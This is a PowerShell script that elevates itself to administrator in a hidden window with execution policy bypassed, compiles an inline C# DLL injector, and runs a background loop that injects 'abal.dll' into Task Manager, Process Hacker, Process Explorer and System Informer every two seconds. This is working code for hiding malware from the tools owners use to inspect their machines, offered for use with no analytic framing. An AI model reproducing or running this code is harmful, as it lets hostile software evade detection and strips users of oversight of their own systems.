# Auto-elevation
function Ensure-RunAsAdmin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
        $psi.Verb = "runas"
        $psi.UseShellExecute = $true
        $psi.WindowStyle = 'Hidden'
        try {
            [System.Diagnostics.Process]::Start($psi) | Out-Null
        } catch {
            Write-Error "User cancelled the elevation prompt."
        }
        exit
    }
}
Ensure-RunAsAdmin

# C# DLL Injector
$injectorCode = @"
using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Injector {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int access, bool inherit, int pid);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, uint size, uint allocType, uint protect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr addr, byte[] buffer, uint size, out UIntPtr written);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hMod, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string modName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr attrs, uint stackSize, IntPtr startAddr, IntPtr param, uint flags, IntPtr threadId);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr handle);

    public const int PROCESS_ALL = 0x1F0FFF;
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_READWRITE = 0x04;

    public static bool Inject(int pid, string dllPath) {
        IntPtr hProc = OpenProcess(PROCESS_ALL, false, pid);
        if (hProc == IntPtr.Zero) return false;

        IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)((dllPath.Length + 1) * 2), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (addr == IntPtr.Zero) return false;

        byte[] bytes = Encoding.Unicode.GetBytes(dllPath);
        UIntPtr written;
        if (!WriteProcessMemory(hProc, addr, bytes, (uint)bytes.Length, out written)) return false;

        IntPtr hMod = GetModuleHandle("kernel32.dll");
        IntPtr loadLib = GetProcAddress(hMod, "LoadLibraryW");
        if (loadLib == IntPtr.Zero) return false;

        IntPtr thread = CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        if (thread == IntPtr.Zero) return false;

        CloseHandle(hProc);
        return true;
    }
}
"@
Add-Type -TypeDefinition $injectorCode -Language CSharp

# Monitoring tool names and DLL path
$monitoringTools = @("Taskmgr", "ProcessHacker", "procexp", "SystemInformer")
$extraDllPath = "C:\Windows\System32\abal.dll"

# Monitor & force-inject abal.dll every 2 seconds into all matching processes
Start-Job -ScriptBlock {
    $monitoringTools = @("Taskmgr", "ProcessHacker", "procexp", "SystemInformer")
    $extraDllPath = "C:\Windows\System32\abal.dll"

    while ($true) {
        foreach ($tool in $monitoringTools) {
            $procs = Get-Process -Name $tool -ErrorAction SilentlyContinue
            foreach ($p in $procs) {
                try {
                    Write-Output "Attempting to inject abal.dll into $($p.ProcessName) (PID: $($p.Id))"
                    $result = [Injector]::Inject($p.Id, $extraDllPath)
                    if ($result) {
                        Write-Output "✅ Injected into $($p.ProcessName) (PID: $($p.Id))"
                    } else {
                        Write-Warning "❌ Injection failed into $($p.ProcessName) (PID: $($p.Id))"
                    }
                } catch {
                    Write-Error "⚠️ Exception: $_"
                }
            }
        }
        Start-Sleep -Seconds 2
    }
} | Out-Null

Write-Output "✅ Injection monitor running. Press Ctrl+C to stop."
